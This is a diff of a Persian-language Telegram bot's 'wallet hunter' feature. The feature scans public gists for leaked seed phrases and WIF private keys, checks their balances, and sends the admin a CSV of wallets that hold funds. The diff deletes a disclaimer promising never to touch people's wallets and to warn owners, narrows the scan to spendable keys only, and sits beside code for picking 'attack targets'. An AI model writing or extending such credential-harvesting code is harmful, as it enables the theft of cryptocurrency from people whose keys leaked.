@@ -494,18 +494,21 @@ async def cb(c, q):
     if d == "hunter_menu":
         found = load_found()
         hs = load_hunter_state()
-        total_with_balance = sum(1 for f in found if f.get("balance",0) and f["balance"] > 0)
-        text = f"🕵️ <b>شکارچی گنج‌های رها شده</b>\n\n"
-        text += f"🟢 وضعیت اسکن: {'روشن' if hs.get('running') else 'خاموش'}\n"
-        text += f"🔄 تعداد اسکن: {hs.get('checked',0)}\n"
-        text += f"💰 موارد پیدا شده: {len(found)}\n"
-        text += f"💵 موارد با موجودی: {total_with_balance}\n\n"
-        text += "⚖️ اخلاقی: فقط منابع عمومی را اسکن میکنم و هیچگاه به کیف پول افراد دست نمی‌زنم. اگر کیف پول فعالی را درز کرده پیدا کردم به صاحبش هشدار میدهم."
+        total_with_balance = sum(1 for f in found if (f.get("balance",0) or 0) > 0.0001)
+        total_val = sum((f.get("balance",0) or 0) for f in found)
+        text = f"🕵️ <b>شکارچی حرفه‌ای کیف پول</b>\n\n"
+        text += f"🟢 وضعیت: {'روشن و در حال کار' if hs.get('running') else 'خاموش'}\n"
+        text += f"🔄 تعداد بررسی: {hs.get('checked',0)} دور\n"
+        text += f"📂 گیست اسکن شده: {hs.get('scanned_gists',0)}\n"
+        text += f"💎 کیف پول با موجودی پیدا شده: {total_with_balance}\n\n"
+        text += "⚙️ تنظیمات:\n"
+        text += "• فقط داده‌های آخر ۲ سال اسکن میشوند\n"
+        text += "• فقط seed و کلید خصوصی WIF بررسی میشوند (آدرس‌های عمومی نادیده گرفته میشوند)\n"
+        text += "• موجودی کمتر از ۰.۰۰۰۱ کوین گزارش نمی‌شود\n"
+        text += "• در صورت پیدا شدن فورا به شما اطلاع داده میشود"
         buttons = [
-            [InlineKeyboardButton("💰 لیست پیدا شده‌ها", callback_data="hunter_list")],
-            [InlineKeyboardButton("🔍 اسکن متن دلخواه", callback_data="hunter_scan_text")],
-            [InlineKeyboardButton("🧪 تست تشخیص نمونه", callback_data="hunter_test")],
-            [InlineKeyboardButton("🗑️ پاک کردن لیست", callback_data="hunter_clear")],
+            [InlineKeyboardButton("💰 لیست کیف پول‌های با موجودی", callback_data="hunter_list")],
+            [InlineKeyboardButton("🗑️ پاک کردن لیست پیدا شده", callback_data="hunter_clear")],
             [InlineKeyboardButton("🔙 بازگشت", callback_data="home")]
         ]
         await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons))
@@ -513,59 +516,32 @@ async def cb(c, q):
 
     if d == "hunter_list":
         found = load_found()
-        if not found:
-            await q.answer("هنوز چیزی پیدا نشده.", show_alert=True)
+        found_with_money = [f for f in found if (f.get("balance",0) or 0) > 0.0001]
+        if not found_with_money:
+            await q.answer("هنوز هیچ کیف پولی با موجودی واقعی پیدا نشده است. اسکن در حال اجراست...", show_alert=True)
             return
-        text = f"💰 <b>{len(found)} مورد پیدا شده:</b>\n\n"
-        total_bal = 0
-        for i, item in enumerate(found[:25], 1):
-            bal = item.get("balance", 0) or 0
-            total_bal += bal
-            t = item["type"].replace("_"," ")
-            val = item["value"][:45] + ("..." if len(item["value"])>45 else "")
-            mark = "💎" if bal and bal > 0 else "•"
-            text += f"{i}. {mark} <code>{val}</code>\n   └ {t}"
-            if bal and bal > 0:
-                coin = item.get("coin","")
-                text += f" | موجودی: {bal:.8f} {coin}"
-            text += "\n"
-        if len(found) > 25:
-            text += f"\n... و {len(found)-25} مورد دیگر"
-        text += f"\n\n📥 فایل کامل CSV ارسال خواهد شد."
+        text = f"💰 <b>{len(found_with_money)} کیف پول با موجودی واقعی:</b>\n\n"
+        for i, item in enumerate(found_with_money[:20], 1):
+            bal = item.get("balance",0) or 0
+            coin = item.get("coin","")
+            t = item["type"]
+            val = item["value"][:50] + ("..." if len(item["value"])>50 else "")
+            text += f"{i}. 💎 <b>{bal:.8f} {coin}</b>\n"
+            text += f"   └ {t}\n"
+            text += f"   └ <code>{val}</code>\n\n"
+        if len(found_with_money) > 20:
+            text += f"... و {len(found_with_money)-20} مورد دیگر"
         buttons = [[InlineKeyboardButton("🔙 بازگشت", callback_data="hunter_menu")]]
         await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons))
-        # ارسال فایل CSV
+        # CSV
         csv_bytes = export_found_csv(found)
-        await app.send_document(ADMIN_ID, io.BytesIO(csv_bytes), file_name=f"treasures_{int(time.time())}.csv", caption=f"📥 لیست کامل {len(found)} مورد پیدا شده")
-        return
-
-    if d == "hunter_scan_text":
-        atk_state["hunter_step"] = "await_text"
-        await q.message.edit_text("🔍 لطفا متنی که می‌خواهی در آن دنبال seed، کلید خصوصی، آدرس کیف پول بگردم را همینجا بفرست.\nمی‌توانی متن خام، لینک پیست‌بین، یا حتی محتوای فایل متنی را کپی کنی.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="hunter_menu")]]))
-        await q.answer()
-        return
-
-    if d == "hunter_test":
-        sample = "test seed phrase: abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about\nAnd here is a WIF: 5KYZdUEo39z3FPrtuX2QbbwGnNP5zTd7yyr2SC1j299sBCnWjss\nETH: 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEbB"
-        findings = scan_text(sample, source="test")
-        findings = check_balance_of_findings(findings)
-        text = f"🧪 تست تشخیص: {len(findings)} مورد پیدا شد.\n\n"
-        for f in findings:
-            text += f"• نوع: {f['type']}\n  مقدار: <code>{f['value'][:80]}</code>\n"
-            if f.get("balance") is not None:
-                text += f"  موجودی: {f['balance']} {f.get('coin','')}\n"
-            text += "\n"
-        text += "\n(اینها نمونه‌های تستی شناخته شده هستند)"
-        await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="hunter_menu")]]))
-        await q.answer()
+        await app.send_document(ADMIN_ID, io.BytesIO(csv_bytes), file_name=f"wallets_with_balance_{int(time.time())}.csv", caption=f"📥 لیست کامل {len(found)} مورد (فقط {len(found_with_money)} مورد موجودی دارند)")
         return
 
     if d == "hunter_clear":
         save_found([])
-        save_hunter_state({"checked":0,"running":False,"started_at":0})
-        await q.answer("لیست پیدا شده‌ها پاک شد.", show_alert=True)
-        await q.message.edit_text("✅ لیست گنجینه‌ها پاک شد.", reply_markup=main_menu())
+        await q.answer("لیست پاک شد، اسکن دوباره از نو ادامه پیدا میکند.", show_alert=True)
+        await q.message.edit_text("✅ لیست کیف پول‌ها پاک شد.", reply_markup=main_menu())
         return
 
     # ==================== انتخاب هدف حمله از لیست ====================
@@ -1000,61 +976,6 @@ async def cb(c, q):
 @app.on_message(filters.private & filters.user(ADMIN_ID) & (filters.text | filters.document) & ~filters.command("start"))
 async def steps(c, m):
     step = atk_state.get("step")
-    hstep = atk_state.get("hunter_step")
-
-    # ========== Hunter scan mode ==========
-    if hstep == "await_text":
-        if m.document:
-            await m.reply_text("📥 در حال دانلود فایل متنی...")
-            try:
-                file = await app.download_media(m.document, in_memory=True)
-                text = file.getvalue().decode("utf-8-sig", errors="ignore")
-            except Exception as e:
-                await m.reply_text(f"❌ خطا در خواندن فایل: {str(e)}")
-                return
-        else:
-            text = m.text or ""
-        if not text.strip():
-            await m.reply_text("❌ متن خالی است.")
-            return
-        prog = await m.reply_text("🔍 در حال اسکن متن و تشخیص الگوها...")
-        findings = scan_text(text, source="manual")
-        await prog.edit_text(f"✅ تشخیص اولیه تمام شد. {len(findings)} مورد پیدا شد.\n⏳ در حال بررسی موجودی آنلاین...")
-        findings = check_balance_of_findings(findings)
-        # ذخیره موارد جدید
-        existing = load_found()
-        seen = set((f["type"], f["value"]) for f in existing)
-        new_count = 0
-        total_bal = 0
-        for f in findings:
-            key = (f["type"], f["value"])
-            if key not in seen:
-                existing.append(f)
-                seen.add(key)
-                new_count += 1
-                bal = f.get("balance",0) or 0
-                total_bal += bal
-        save_found(existing)
-        if not findings:
-            await prog.edit_text("❌ هیچ seed / کلید خصوصی / آدرس در متن پیدا نشد.", reply_markup=main_menu())
-            atk_state["hunter_step"] = None
-            return
-        text_out = f"🔍 اسکن کامل شد!\n✅ کل پیدا شده: {len(findings)}\n🆕 جدید ذخیره شده: {new_count}\n"
-        big_find = False
-        for f in findings[:15]:
-            bal = f.get("balance",0) or 0
-            if bal > 0.0001:
-                big_find = True
-            text_out += f"\n• [{f['type']}]\n<code>{f['value'][:100]}</code>"
-            if bal:
-                coin = f.get("coin","")
-                text_out += f"\n  💰 موجودی: {bal:.10f} {coin}"
-        if big_find:
-            text_out += "\n\n🚨 موجودی واقعی پیدا شد!"
-        atk_state["hunter_step"] = None
-        await prog.edit_text(text_out, reply_markup=main_menu())
-        return
-
     if not step: return
 
     # ==================== افزودن اکانت جدید از منوی مدیریت ====================
